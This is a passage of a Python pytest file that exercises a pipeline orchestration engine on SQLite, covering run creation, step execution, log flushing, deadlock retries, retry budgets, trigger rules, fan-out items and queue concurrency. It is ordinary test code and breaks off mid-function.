"""Tests for the engine end to end on SQLite: claim, execute, settle, recover."""

import asyncio
from contextlib import AbstractAsyncContextManager
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any, cast
from uuid import UUID

import pytest
import sqlalchemy as sa
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
from pydantic import BaseModel
from sqlalchemy.exc import DBAPIError
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from dirigent_client.enums import (
    AlertEvent,
    AttemptKind,
    AttemptStatus,
    LogLevel,
    RunItemStatus,
    RunStatus,
    TriggerKind,
)
from dirigent_core.artifacts import canonical_json
from dirigent_core.config import Settings
from dirigent_core.database import DEADLOCK, session_scope
from dirigent_core.engine import EngineServices
from dirigent_core.engine.definition import (
    ConcurrencyPolicy,
    ItemPolicy,
    PipelineDefinition,
    RetryPolicy,
    StepDefinition,
    TimeoutAction,
    TriggerRule,
)
from dirigent_core.engine.executor import Engine, probe_interval, timeout_failure
from dirigent_core.engine.recovery import detect_stuck_runs, sweep_leases
from dirigent_core.engine.runs import (
    Attribution,
    FanOutError,
    RunCreationError,
    cancel_run,
    create_run,
    idempotency_scope,
    retry_step,
    save_pipeline,
)
from dirigent_core.models import (
    AlertRule,
    ArtifactRef,
    Connection,
    LogEntry,
    Notification,
    Run,
    RunItem,
    StepAttempt,
    utcnow,
)
from dirigent_core.plugins import PluginHost
from dirigent_core.secrets import SecretBox
from dirigent_core.storage import FileStorageBackend, FileStorageConfig, Storage, parse_uri
from dirigent_plugin import ByteSink, ErrorClass, ProbeStatus, RemoteHandle
from engineblocks import (
    ChattyOperator,
    CursorSensor,
    EchoOperator,
    FailOperator,
    RemoteOperator,
    TickSensor,
    UnsafeOperator,
)


class _Aborted(Exception):
    """A driver error carrying the SQLSTATE PostgreSQL reports for a broken deadlock."""

    def __init__(self, sqlstate: str) -> None:
        """Carry the SQLSTATE."""
        super().__init__(sqlstate)
        self.sqlstate = sqlstate


#: Retries in these tests are immediate, so a drained run does not wait on wall-clock time.
FAST_RETRY = RetryPolicy(max_attempts=3, backoff=timedelta(0), jitter=0.0)


def steps(**definitions: StepDefinition) -> dict[str, StepDefinition]:
    """Build a steps map from keyword arguments, which reads like the document does."""
    return dict(definitions)


async def start(
    sessions: async_sessionmaker[AsyncSession],
    services: EngineServices,
    definition: PipelineDefinition,
    log_levels: dict[str, str] | None = None,
    **params: Any,
) -> Run:
    """Save a pipeline version and create one run of it, as an ad hoc trigger would."""
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        run = await create_run(session, services, version, params=params or None, log_levels=log_levels)
    assert run is not None
    return run


async def drain(
    engine: Engine, *, start_at: datetime | None = None, step: timedelta = timedelta(seconds=5), limit: int = 400
) -> datetime:
    """Claim and run every due unit, advancing a virtual clock so waits and retries come due."""
    moment = start_at or datetime.now(UTC)
    for _ in range(limit):
        unit = await engine.claim(now=moment)
        if unit is None:
            return moment
        await engine.run_unit(unit, now=moment)
        moment += step
    raise AssertionError("the run never settled")


async def reload(sessions: async_sessionmaker[AsyncSession], run_id: UUID) -> Run:
    """Read a run back from the database."""
    async with sessions() as session:
        run = await session.get(Run, run_id)
        assert run is not None
        return run


async def attempts_of(sessions: async_sessionmaker[AsyncSession], run_id: UUID) -> list[StepAttempt]:
    """Read every attempt of a run, oldest first."""
    async with sessions() as session:
        rows = await session.execute(
            sa.select(StepAttempt)
            .where(StepAttempt.run_id == run_id)
            .order_by(StepAttempt.step_name, StepAttempt.attempt)
        )
        return list(rows.scalars())


async def statuses(sessions: async_sessionmaker[AsyncSession], run_id: UUID) -> dict[str, list[AttemptStatus]]:
    """Summarise a run as step name to the statuses of its attempts."""
    summary: dict[str, list[AttemptStatus]] = {}
    for attempt in await attempts_of(sessions, run_id):
        summary.setdefault(attempt.step_name, []).append(attempt.status)
    return summary


# -- run creation ----------------------------------------------------------------


async def test_a_run_writes_its_whole_shape_up_front(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="chain",
        steps=steps(
            first=StepDefinition(block="test.echo"),
            second=StepDefinition(block="test.echo", depends_on=["first"]),
        ),
    )
    run = await start(sessions, services, definition)
    assert run.status is RunStatus.QUEUED
    assert await statuses(sessions, run.id) == {
        "first": [AttemptStatus.QUEUED],
        "second": [AttemptStatus.PENDING],
    }


async def test_parameters_are_validated_and_defaulted_at_creation(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="parameterised",
        params={
            "type": "object",
            "required": ["day"],
            "properties": {"day": {"type": "string"}, "limit": {"type": "integer", "default": 5}},
        },
        steps=steps(only=StepDefinition(block="test.echo")),
    )
    run = await start(sessions, services, definition, day="2026-08-28")
    assert run.params == {"day": "2026-08-28", "limit": 5}


async def test_attribution_is_recorded_as_a_reference(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="attributed", steps=steps(only=StepDefinition(block="test.echo")))
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        run = await create_run(
            session,
            services,
            version,
            attribution=Attribution(kind=TriggerKind.USER, label="morten"),
        )
    assert run is not None
    assert run.triggered_by_kind is TriggerKind.USER
    assert run.triggered_by_label == "morten"


# -- execution -------------------------------------------------------------------


async def test_a_chain_runs_to_completion_and_passes_outputs_downstream(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="chain",
        params={"type": "object", "properties": {"greeting": {"type": "string", "default": "hello"}}},
        steps=steps(
            first=StepDefinition(block="test.echo", config={"value": "${params.greeting}"}),
            second=StepDefinition(
                block="test.echo",
                depends_on=["first"],
                config={"value": "${steps.first.output.value} again", "upper": True},
            ),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert EchoOperator.calls == ["hello", "hello again"]
    by_step = {attempt.step_name: attempt for attempt in await attempts_of(sessions, run.id)}
    assert by_step["second"].output == {"value": "HELLO AGAIN", "length": 11}
    assert by_step["first"].status is AttemptStatus.SUCCEEDED
    assert by_step["first"].output_artifact_id is not None
    assert by_step["first"].lease_owner is None


async def test_block_log_entries_reach_the_run(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(code="logged", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    await drain(engine)
    async with sessions() as session:
        rows = await session.execute(sa.select(LogEntry).where(LogEntry.run_id == run.id))
        entries = list(rows.scalars())
    # The block also logged at debug, and a run that asked for nothing keeps info and up.
    assert [entry.message for entry in entries] == ["echoing"]
    assert entries[0].step_name == "only"
    assert entries[0].fields == {"value": "hello"}


async def test_a_run_that_asked_for_debug_keeps_it(engine: Engine, sessions: Any, services: EngineServices) -> None:
    """The run's own map decides what its workers persist, block by block."""
    definition = PipelineDefinition(code="loud", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition, log_levels={"*": "debug"})
    await drain(engine)
    async with sessions() as session:
        rows = await session.execute(sa.select(LogEntry).where(LogEntry.run_id == run.id).order_by(LogEntry.id))
        messages = [entry.message for entry in rows.scalars()]
    assert messages == ["echoing quietly", "echoing"]


async def test_a_pattern_raises_one_block_and_not_another(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A family named by pattern is loud while the rest of the run stays at the default."""
    definition = PipelineDefinition(code="half-loud", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition, log_levels={"http.*": "debug"})
    await drain(engine)
    async with sessions() as session:
        rows = await session.execute(sa.select(LogEntry).where(LogEntry.run_id == run.id).order_by(LogEntry.id))
        messages = [entry.message for entry in rows.scalars()]
    assert messages == ["echoing"]


#: How long a test waits for a flusher running on the interval below to land its entries.
FLUSH_TIMEOUT = 5.0

#: The interval the flushing engine below runs on, short enough to watch inside a test.
FLUSH_INTERVAL = timedelta(milliseconds=20)

#: What the step held at the size gate logs, which is the batch that engine is given.
GATED_LINES = 5


def flushing_engine(
    sessions: async_sessionmaker[AsyncSession], settings: Settings, host: PluginHost
) -> tuple[Engine, EngineServices]:
    """An engine whose flusher runs often enough for a test to read a running attempt's log."""
    services = EngineServices.build(settings.model_copy(update={"log_flush_interval": FLUSH_INTERVAL}), host)
    return Engine(sessions, services, owner="worker-under-test"), services


async def logged_so_far(sessions: async_sessionmaker[AsyncSession], run_id: UUID, count: int) -> list[str]:
    """Wait until a flush has landed at least ``count`` entries, and say what the run holds."""
    for _ in range(int(FLUSH_TIMEOUT / 0.01)):
        messages = [entry.message for entry in await logs_of(sessions, run_id)]
        if len(messages) >= count:
            return messages
        await asyncio.sleep(0.01)
    raise AssertionError(f"only {len(await logs_of(sessions, run_id))} entries reached the run")


class _BrokenSession:
    """A session that refuses every statement, standing in for a database a flush cannot reach."""

    async def __aenter__(self) -> "_BrokenSession":
        """Hand itself to the transaction scope."""
        return self

    async def __aexit__(self, *exception: object) -> bool:
        """Close without swallowing what was raised."""
        return False

    async def execute(self, *args: Any, **kwargs: Any) -> Any:
        """Refuse the statement."""
        raise RuntimeError("the database is unreachable")

    async def commit(self) -> None:
        """Nothing was written."""

    async def rollback(self) -> None:
        """Nothing was written."""


class _BrokenSessions:
    """A session factory whose first sessions cannot write, and which then works normally."""

    def __init__(self, real: async_sessionmaker[AsyncSession], fails: int) -> None:
        """Refuse this many sessions before handing out real ones."""
        self._real = real
        self._fails = fails

    def __call__(self) -> Any:
        """Hand out a session, broken while any refusals are left."""
        if self._fails > 0:
            self._fails -= 1
            return _BrokenSession()
        return self._real()


async def test_a_step_flushes_its_log_to_the_run_while_it_is_still_running(
    sessions: Any, settings: Settings, host: PluginHost
) -> None:
    """A ten-minute command is visible working: its lines land before its outcome does.

    Held at the gate, the attempt has settled nothing, so anything the run holds got there
    from a flush.
    """
    engine, services = flushing_engine(sessions, settings, host)
    definition = PipelineDefinition(
        code="chatty",
        steps=steps(only=StepDefinition(block="test.chatty", config={"lines": 2, "gate": True})),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    attempt = asyncio.create_task(engine.run_unit(unit))
    try:
        await asyncio.wait_for(ChattyOperator.at_gate.wait(), FLUSH_TIMEOUT)
        assert await logged_so_far(sessions, run.id, 2) == ["line 0", "line 1"]
    finally:
        ChattyOperator.released.set()
        await attempt
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["line 0", "line 1", "done"], (
        "flushed entries are written once, in the order they were logged"
    )
    assert (await attempts_of(sessions, run.id))[0].status is AttemptStatus.SUCCEEDED


async def test_a_buffer_at_the_size_gate_is_flushed_without_waiting_for_the_interval(
    sessions: Any, settings: Settings, host: PluginHost
) -> None:
    """The flusher waits on the gate as well as the clock, so a chatty step is visible at once."""
    quiet = settings.model_copy(update={"log_flush_interval": timedelta(seconds=30), "log_flush_batch": GATED_LINES})
    services = EngineServices.build(quiet, host)
    engine = Engine(sessions, services, owner="worker-under-test")
    definition = PipelineDefinition(
        code="gated",
        steps=steps(only=StepDefinition(block="test.chatty", config={"lines": GATED_LINES, "gate": True})),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    attempt = asyncio.create_task(engine.run_unit(unit))
    try:
        await asyncio.wait_for(ChattyOperator.at_gate.wait(), FLUSH_TIMEOUT)
        landed = await logged_so_far(sessions, run.id, GATED_LINES)
    finally:
        ChattyOperator.released.set()
        await attempt
    assert landed == [f"line {index}" for index in range(GATED_LINES)]


async def test_a_flush_that_failed_leaves_its_entries_to_be_written_later(
    sessions: Any, settings: Settings, host: PluginHost
) -> None:
    """At least once, never twice: a flush that never committed keeps its lines buffered."""
    engine, services = flushing_engine(sessions, settings, host)
    definition = PipelineDefinition(
        code="unreachable",
        steps=steps(only=StepDefinition(block="test.chatty", config={"lines": 2, "gate": True})),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    engine.sessions = cast("async_sessionmaker[AsyncSession]", _BrokenSessions(sessions, fails=1))
    attempt = asyncio.create_task(engine.run_unit(unit))
    try:
        await asyncio.wait_for(ChattyOperator.at_gate.wait(), FLUSH_TIMEOUT)
        assert await logged_so_far(sessions, run.id, 2) == ["line 0", "line 1"], "the flush after the failed one"
    finally:
        ChattyOperator.released.set()
        await attempt
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["line 0", "line 1", "done"]


async def test_a_step_whose_whole_log_was_flushed_leaves_no_engine_trace(
    sessions: Any, settings: Settings, host: PluginHost
) -> None:
    """The engine's own line is for an attempt that said nothing, not one that said it early."""
    engine, services = flushing_engine(sessions, settings, host)
    definition = PipelineDefinition(
        code="accounted",
        steps=steps(only=StepDefinition(block="test.chatty", config={"lines": 1, "gate": True, "last": False})),
    )
    run = await start(sessions, services, definition)
    unit = await engine.claim()
    assert unit is not None
    attempt = asyncio.create_task(engine.run_unit(unit))
    try:
        await asyncio.wait_for(ChattyOperator.at_gate.wait(), FLUSH_TIMEOUT)
        assert await logged_so_far(sessions, run.id, 1) == ["line 0"], "the outcome has nothing left to write"
    finally:
        ChattyOperator.released.set()
        await attempt
    assert [entry.message for entry in await logs_of(sessions, run.id)] == ["line 0"]


async def test_a_handle_the_database_aborted_is_written_by_the_retry(
    engine: Engine, sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Recording the handle is its own transaction, and takes the run lock like an outcome.

    It was left out of the retry when the claim and the outcome were covered, and deadlocked
    under contention: a submitted job whose handle never landed is one nothing can probe.
    """
    definition = PipelineDefinition(
        code="aborted-handle",
        steps=steps(
            job=StepDefinition(
                block="test.remote",
                config={"statuses": ["succeeded"]},
                poll=timedelta(seconds=1),
            )
        ),
    )
    run = await start(sessions, services, definition)

    once = iter([True])
    original = Engine._record_handle_once  # pyright: ignore[reportPrivateUsage] - the seam a deadlock lands on

    async def deadlock_first(self: Engine, *args: Any, **kwargs: Any) -> None:
        if next(once, False):
            raise DBAPIError("SELECT 1", None, _Aborted(DEADLOCK))
        await original(self, *args, **kwargs)

    monkeypatch.setattr(Engine, "_record_handle_once", deadlock_first)
    await drain(engine, step=timedelta(seconds=2))

    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].remote_handle is not None, "the retry wrote the handle the first run lost"
    assert attempts[0].status is AttemptStatus.SUCCEEDED


async def test_an_outcome_the_database_aborted_keeps_the_log_it_buffered(
    engine: Engine, sessions: Any, services: EngineServices, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A deadlock rolls the outcome back, and the entries must survive to be written again.

    Draining the buffered logger empties it, so a retry that drained inside the transaction
    would commit an outcome with no log against it.
    """
    definition = PipelineDefinition(code="aborted", steps=steps(only=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)

    once = iter([True])
    original = Engine._record_once  # pyright: ignore[reportPrivateUsage] - the seam a deadlock lands on

    async def deadlock_first(self: Engine, *args: Any, **kwargs: Any) -> None:
        if next(once, False):
            raise DBAPIError("SELECT 1", None, _Aborted(DEADLOCK))
        await original(self, *args, **kwargs)

    monkeypatch.setattr(Engine, "_record_once", deadlock_first)
    await drain(engine)

    async with sessions() as session:
        rows = await session.execute(sa.select(LogEntry).where(LogEntry.run_id == run.id))
        entries = list(rows.scalars())
        stored = await session.get(Run, run.id)
    assert [entry.message for entry in entries] == ["echoing"], "the retry wrote the entries the first run held"
    assert stored is not None and stored.status is RunStatus.SUCCEEDED


async def test_an_unknown_reference_fails_the_step_as_rejected(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="broken-reference",
        steps=steps(only=StepDefinition(block="test.echo", config={"value": "${params.missing}"}, retry=FAST_RETRY)),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    attempts = await attempts_of(sessions, run.id)
    assert len(attempts) == 1, "a rejected failure must not consume retry budget"
    assert attempts[0].status is AttemptStatus.FAILED
    assert attempts[0].error_class == ErrorClass.REJECTED.value
    assert "params.missing" in (attempts[0].error or "")
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED


async def test_config_that_does_not_match_the_block_schema_is_rejected(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="bad-config",
        steps=steps(only=StepDefinition(block="test.echo", config={"value": {"not": "a string"}})),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    attempts = await attempts_of(sessions, run.id)
    assert attempts[0].error_class == ErrorClass.REJECTED.value


# -- retries ---------------------------------------------------------------------


async def test_a_transient_failure_retries_until_it_succeeds(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="flaky",
        steps=steps(only=StepDefinition(block="test.fail", config={"fail_times": 2}, retry=FAST_RETRY)),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    assert await statuses(sessions, run.id) == {
        "only": [AttemptStatus.FAILED, AttemptStatus.FAILED, AttemptStatus.SUCCEEDED]
    }
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    assert FailOperator.attempts["default"] == 3


async def test_the_retry_budget_is_finite(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="doomed",
        steps=steps(only=StepDefinition(block="test.fail", retry=FAST_RETRY)),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert await statuses(sessions, run.id) == {"only": [AttemptStatus.FAILED] * 3}
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED


async def test_a_rejected_failure_is_never_retried(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="refused",
        steps=steps(
            only=StepDefinition(
                block="test.fail",
                config={"error_class": "rejected"},
                retry=FAST_RETRY,
            )
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert await statuses(sessions, run.id) == {"only": [AttemptStatus.FAILED]}


async def test_an_unknown_failure_spends_the_retry_budget(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """max_attempts is declared for the failures nobody classified, whatever the block declares."""
    definition = PipelineDefinition(
        code="unknown-failures",
        steps=steps(
            idempotent=StepDefinition(
                block="test.fail", config={"error_class": "unknown", "key": "a"}, retry=FAST_RETRY
            ),
            fragile=StepDefinition(
                block="test.fragile", config={"error_class": "unknown", "key": "b"}, retry=FAST_RETRY
            ),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    summary = await statuses(sessions, run.id)
    assert summary["idempotent"] == [AttemptStatus.FAILED] * 3
    assert summary["fragile"] == [AttemptStatus.FAILED] * 3
    attempts = await attempts_of(sessions, run.id)
    assert {attempt.error_class for attempt in attempts} == {ErrorClass.UNKNOWN.value}


async def test_a_retry_is_scheduled_in_the_future_rather_than_slept_on(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="backed-off",
        steps=steps(
            only=StepDefinition(
                block="test.fail",
                retry=RetryPolicy(max_attempts=2, backoff=timedelta(minutes=5), jitter=0.0),
            )
        ),
    )
    run = await start(sessions, services, definition)
    moment = await drain(engine, limit=3)
    attempts = await attempts_of(sessions, run.id)
    assert len(attempts) == 2
    assert attempts[1].status is AttemptStatus.QUEUED
    assert attempts[1].available_at is not None
    assert attempts[1].available_at > moment
    assert (await reload(sessions, run.id)).status is RunStatus.RUNNING


# -- trigger rules ---------------------------------------------------------------


async def test_a_failure_skips_dependents_behind_all_success(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="propagating-skip",
        steps=steps(
            work=StepDefinition(block="test.fail"),
            after=StepDefinition(block="test.echo", depends_on=["work"]),
            later=StepDefinition(block="test.echo", depends_on=["after"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert await statuses(sessions, run.id) == {
        "work": [AttemptStatus.FAILED],
        "after": [AttemptStatus.SKIPPED],
        "later": [AttemptStatus.SKIPPED],
    }
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED


async def test_an_error_handler_branch_runs_behind_one_failed(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="handled",
        steps=steps(
            work=StepDefinition(block="test.fail"),
            cleanup=StepDefinition(block="test.echo", depends_on=["work"], rule=TriggerRule.ONE_FAILED),
            success_only=StepDefinition(block="test.echo", depends_on=["work"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    summary = await statuses(sessions, run.id)
    assert summary["cleanup"] == [AttemptStatus.SUCCEEDED]
    assert summary["success_only"] == [AttemptStatus.SKIPPED]


async def test_all_done_runs_whatever_the_prerequisite_said(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="always-after",
        steps=steps(
            work=StepDefinition(block="test.fail"),
            report=StepDefinition(block="test.echo", depends_on=["work"], rule=TriggerRule.ALL_DONE),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert (await statuses(sessions, run.id))["report"] == [AttemptStatus.SUCCEEDED]


async def test_continue_on_failure_lets_the_branch_carry_on(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="tolerated",
        steps=steps(
            optional=StepDefinition(block="test.fail", continue_on_failure=True),
            after=StepDefinition(block="test.echo", depends_on=["optional"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    summary = await statuses(sessions, run.id)
    assert summary["optional"] == [AttemptStatus.FAILED]
    assert summary["after"] == [AttemptStatus.SUCCEEDED]
    assert (await reload(sessions, run.id)).status is RunStatus.COMPLETED_WITH_ERRORS


# -- fan-out ---------------------------------------------------------------------


async def test_a_fan_out_step_creates_one_item_per_element(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="fanned",
        params={"type": "object", "properties": {"regions": {"type": "array", "default": ["no", "se", "dk"]}}},
        steps=steps(push=StepDefinition(block="test.echo", for_each="${params.regions}", config={"value": "${item}"})),
    )
    run = await start(sessions, services, definition)
    async with sessions() as session:
        rows = await session.execute(sa.select(RunItem).where(RunItem.run_id == run.id).order_by(RunItem.item_index))
        items = list(rows.scalars())
    assert [item.item_key for item in items] == ["no", "se", "dk"]

    await drain(engine)
    assert sorted(EchoOperator.calls) == ["dk", "no", "se"]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED
    async with sessions() as session:
        rows = await session.execute(sa.select(RunItem).where(RunItem.run_id == run.id))
        assert {item.status for item in rows.scalars()} == {RunItemStatus.SUCCEEDED}


async def test_one_bad_item_sinks_the_batch_under_fail_fast(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="strict-batch",
        steps=steps(
            push=StepDefinition(
                block="test.fail",
                for_each=["ok", "bad"],
                config={"fail_times": 1, "key": "${item}"},
                items=ItemPolicy.FAIL_FAST,
            )
        ),
    )
    run = await start(sessions, services, definition)
    FailOperator.attempts["ok"] = 1  # "ok" has already used its one failure; only "bad" fails.
    await drain(engine)

    async with sessions() as session:
        rows = await session.execute(sa.select(RunItem).where(RunItem.run_id == run.id).order_by(RunItem.item_index))
        items = list(rows.scalars())
    assert [item.status for item in items] == [RunItemStatus.SUCCEEDED, RunItemStatus.FAILED]
    assert (await reload(sessions, run.id)).status is RunStatus.FAILED


async def test_items_continue_isolates_a_failing_item(engine: Engine, sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="tolerant-batch",
        steps=steps(
            push=StepDefinition(
                block="test.fail",
                for_each=["good-1", "bad", "good-2"],
                config={"fail_times": 1, "key": "${item}"},
                items=ItemPolicy.CONTINUE,
            ),
            after=StepDefinition(block="test.echo", depends_on=["push"]),
        ),
    )
    run = await start(sessions, services, definition)
    FailOperator.attempts["good-1"] = 1
    FailOperator.attempts["good-2"] = 1
    await drain(engine)

    async with sessions() as session:
        rows = await session.execute(sa.select(RunItem).where(RunItem.run_id == run.id).order_by(RunItem.item_index))
        items = list(rows.scalars())
    assert [item.status for item in items] == [
        RunItemStatus.SUCCEEDED,
        RunItemStatus.FAILED,
        RunItemStatus.SUCCEEDED,
    ]
    assert items[1].failing_step == "push"
    assert (await statuses(sessions, run.id))["after"] == [AttemptStatus.SUCCEEDED]
    assert (await reload(sessions, run.id)).status is RunStatus.COMPLETED_WITH_ERRORS


async def test_a_fan_out_under_items_continue_whose_every_item_failed_fails_the_run(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """``continue`` means carry on past the items that failed, not "this step cannot fail"."""
    definition = PipelineDefinition(
        code="hopeless-batch",
        steps=steps(
            push=StepDefinition(
                block="test.fail",
                for_each=["bad-1", "bad-2"],
                config={"key": "${item}"},
                items=ItemPolicy.CONTINUE,
            ),
            after=StepDefinition(block="test.echo", depends_on=["push"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)

    assert (await reload(sessions, run.id)).status is RunStatus.FAILED
    assert (await statuses(sessions, run.id))["after"] == [AttemptStatus.SKIPPED]
    assert EchoOperator.calls == [], "the dependents must not run on a step that produced nothing"


async def test_cancelling_the_active_run_releases_the_run_held_behind_queue(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A cancelled run frees the concurrency slot exactly as a finished one does."""
    definition = PipelineDefinition(
        code="queue-then-cancel",
        concurrency=ConcurrencyPolicy.QUEUE,
        steps=steps(a=StepDefinition(block="test.echo")),
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
    assert first is not None and second is not None
    assert (await statuses(sessions, second.id))["a"] == [AttemptStatus.PENDING]

    async with session_scope(sessions) as session:
        stored = await session.get(Run, first.id)
        assert stored is not None
        await cancel_run(session, services, stored, reason="an operator asked")

    assert (await statuses(sessions, second.id))["a"] == [AttemptStatus.QUEUED]
    await drain(engine)
    assert (await reload(sessions, second.id)).status is RunStatus.SUCCEEDED


async def test_cancelling_a_held_run_leaves_the_slot_to_the_run_that_holds_it(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A run that never occupied the slot cannot free it, or a queue pipeline runs twice."""
    definition = PipelineDefinition(
        code="queue-then-cancel-held",
        concurrency=ConcurrencyPolicy.QUEUE,
        steps=steps(a=StepDefinition(block="test.echo")),
    )
    async with session_scope(sessions) as session:
        version = await save_pipeline(session, definition)
        first = await create_run(session, services, version)
        second = await create_run(session, services, version)
        third = await create_run(session, services, version)
    assert first is not None and second is not None and third is not None

    running = await engine.claim()
    assert running is not None and running.run_id == first.id

    async with session_scope(sessions) as session:
        stored = await session.get(Run, second.id)
        assert stored is not None
        await cancel_run(session, services, stored, reason="an operator asked")

    assert (await statuses(sessions, third.id))["a"] == [AttemptStatus.PENDING]
    assert await engine.claim() is None, "two runs of a queue pipeline were released at once"

    await engine.run_unit(running)
    await drain(engine)
    assert (await reload(sessions, third.id)).status is RunStatus.SUCCEEDED


async def test_cancelling_a_run_that_already_finished_leaves_its_status_alone(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    """A terminal status is terminal; a cancel arriving late must not rewrite history."""
    definition = PipelineDefinition(code="already-done", steps=steps(a=StepDefinition(block="test.echo")))
    run = await start(sessions, services, definition)
    await drain(engine)

    async with session_scope(sessions) as session:
        stored = await session.get(Run, run.id)
        assert stored is not None
        await cancel_run(session, services, stored, reason="too late")

    reloaded = await reload(sessions, run.id)
    assert reloaded.status is RunStatus.SUCCEEDED
    assert reloaded.error is None


async def test_a_fan_out_over_an_empty_list_skips_the_step(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="empty-batch",
        steps=steps(
            push=StepDefinition(block="test.echo", for_each=[]),
            after=StepDefinition(block="test.echo", depends_on=["push"]),
        ),
    )
    run = await start(sessions, services, definition)
    await drain(engine)
    assert (await statuses(sessions, run.id))["after"] == [AttemptStatus.SKIPPED]


async def test_a_fan_out_over_an_upstream_output_is_refused_at_creation(
    sessions: Any, services: EngineServices
) -> None:
    definition = PipelineDefinition(
        code="late-fanout",
        steps=steps(
            first=StepDefinition(block="test.echo"),
            push=StepDefinition(block="test.echo", depends_on=["first"], for_each="${steps.first.output.value}"),
        ),
    )
    with pytest.raises(FanOutError, match="expanded when the run is created"):
        await start(sessions, services, definition)


async def test_a_fan_out_over_a_non_list_is_refused(sessions: Any, services: EngineServices) -> None:
    definition = PipelineDefinition(
        code="scalar-fanout",
        params={"type": "object", "properties": {"one": {"type": "integer", "default": 1}}},
        steps=steps(push=StepDefinition(block="test.echo", for_each="${params.one}")),
    )
    with pytest.raises(FanOutError, match="not a list"):
        await start(sessions, services, definition)


# -- adopted grids ---------------------------------------------------------------


def _paired(after: StepDefinition | None = None, **overrides: Any) -> PipelineDefinition:
    """Two fan-outs over the same grid: ``spread`` produces, ``collect`` reads its match."""
    collect = StepDefinition(
        block="test.echo",
        depends_on=["spread"],
        for_each="${steps.spread.items}",
        config={"value": "paired-${steps.spread.item.output.value}"},
        **overrides,
    )
    built = steps(
        spread=StepDefinition(
            block="test.echo",
            for_each=["no", "se", "dk"],
            config={"value": "${item}"},
        ),
        collect=collect,
    )
    if after is not None:
        built["after"] = after
    return PipelineDefinition(code="paired", steps=built)


async def test_an_adopting_step_pairs_each_item_with_its_match(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    run = await start(sessions, services, _paired())
    async with sessions() as session:
        rows = await session.execute(
            sa.select(RunItem)
            .where(RunItem.run_id == run.id, RunItem.step_name == "collect")
            .order_by(RunItem.item_index)
        )
        assert [item.item_key for item in rows.scalars()] == ["no", "se", "dk"]

    await drain(engine)
    assert sorted(EchoOperator.calls) == ["dk", "no", "paired-dk", "paired-no", "paired-se", "se"]
    assert (await reload(sessions, run.id)).status is RunStatus.SUCCEEDED


async def test_an_adopting_step_joins_the_whole_grid_afterwards(
    engine: Engine, sessions: Any, services: EngineServices
) -> None:
    after = StepDefinition(
